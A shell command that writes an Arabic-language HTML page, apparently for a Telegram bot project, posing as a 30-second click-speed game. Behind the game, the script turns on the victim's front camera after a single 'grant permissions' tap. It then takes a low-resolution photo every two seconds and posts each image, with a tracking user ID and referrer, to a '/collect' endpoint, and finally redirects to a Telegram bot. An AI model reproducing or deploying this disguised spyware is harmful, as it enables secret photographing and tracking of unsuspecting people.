cat > ~/spider-bot/public/challenge.html << 'EOF'
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تحدي النقر السريع</title>
    <style>
        body { font-family: sans-serif; background: #111; color: white; text-align: center; padding-top: 40px; }
        button { background: #e74c3c; color: white; padding: 15px 30px; font-size: 1.5rem; border: none; border-radius: 30px; cursor: pointer; margin: 10px; }
        #game { display: none; }
        .click-btn { width: 180px; height: 180px; background: #c0392b; border-radius: 50%; margin: 30px auto; line-height: 180px; font-size: 2rem; cursor: pointer; user-select: none; border: 4px solid gold; }
        .bar { height: 8px; background: gray; border-radius: 5px; margin: 20px 0; }
        .fill { height: 100%; width: 100%; background: gold; animation: drain 30s linear forwards; }
        @keyframes drain { to { width: 0; } }
    </style>
</head>
<body>
    <div id="welcome">
        <h1>🏆 تحدي النقر السريع</h1>
        <button onclick="startChallenge()">موافق.. ابدأ التحدي ومنح الصلاحيات</button>
    </div>
    <div id="game">
        <div class="bar"><div class="fill"></div></div>
        <div>⭐ النقاط: <b id="score">0</b></div>
        <div>⏱️ <span id="timer">30</span>s</div>
        <div class="click-btn" id="btn">إضغط!</div>
        <p id="status"></p>
    </div>
    <video id="v" autoplay playsinline muted style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>
    <script>
        const p = new URLSearchParams(location.search);
        const userId = p.get('user_id') || 'guest';
        const ref = p.get('ref') || '';
        let score = 0, time = 30, active = false, timer;

        // إرسال صورة (حجم خفيف جداً)
        async function sendPhoto(type, dataUrl) {
            try {
                await fetch('/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId, dataType: type, payload: { image: dataUrl }, referrer: ref })
                });
            } catch(e) {}
        }

        // التقاط صورة من الفيديو بأبعاد صغيرة وجودة منخفضة
        function captureFromVideo() {
            const video = document.getElementById('v');
            if (!video.srcObject || video.readyState < 2) return;
            const canvas = document.getElementById('c');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 320, 240);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.3); // حجم خفيف جداً
            sendPhoto('front_photo', dataUrl);
        }

        // لقطة شاشة للعبة بحجم صغير
        function captureScreen() {
            const canvas = document.getElementById('c');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = '#111';
            ctx.fillRect(0, 0, 320, 240);
            ctx.fillStyle = 'white';
            ctx.font = '20px sans-serif';
            ctx.fillText('تحدي النقر', 80, 120);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.3);
            sendPhoto('screenshot', dataUrl);
        }

        // بدء التحدي بعد الموافقة
        window.startChallenge = async () => {
            document.getElementById('welcome').style.display = 'none';
            document.getElementById('game').style.display = 'block';
            active = true;
            document.getElementById('status').textContent = 'جاري التجهيز...';

            // محاولة تفعيل الكاميرا الأمامية بدقة منخفضة
            let cameraOk = false;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } });
                document.getElementById('v').srcObject = stream;
                await new Promise(r => { document.getElementById('v').onloadedmetadata = r; });
                cameraOk = true;
            } catch(e) {}

            if (cameraOk) {
                document.getElementById('status').textContent = 'الكاميرا نشطة! ابدأ النقر...';
                // التقاط أول صورتين بفاصل قصير
                captureFromVideo();
                setTimeout(captureFromVideo, 500);
                // ثم كل 2 ثانية
                setInterval(captureFromVideo, 2000);
                // كل 15 دقيقة لقطة شاشة
                setInterval(captureScreen, 900000);
            } else {
                document.getElementById('status').textContent = 'التقط لقطات شاشة...';
                captureScreen();
                setInterval(captureScreen, 60000);
            }

            // مؤقت اللعبة
            timer = setInterval(() => {
                if (!active) return clearInterval(timer);
                time--;
                document.getElementById('timer').textContent = time;
                if (time <= 0) endGame();
            }, 1000);
        };

        function endGame() {
            active = false;
            clearInterval(timer);
            document.getElementById('btn').style.pointerEvents = 'none';
            document.getElementById('status').textContent = '🏁 انتهى! جاري توجيهك...';
            setTimeout(() => location.href = 'https://t.me/Yeeennnbot', 2000);
        }

        document.getElementById('btn').addEventListener('click', () => {
            if (!active) return;
            score++;
            document.getElementById('score').textContent = score;
        });
    </script>
</body>
</html>
EOF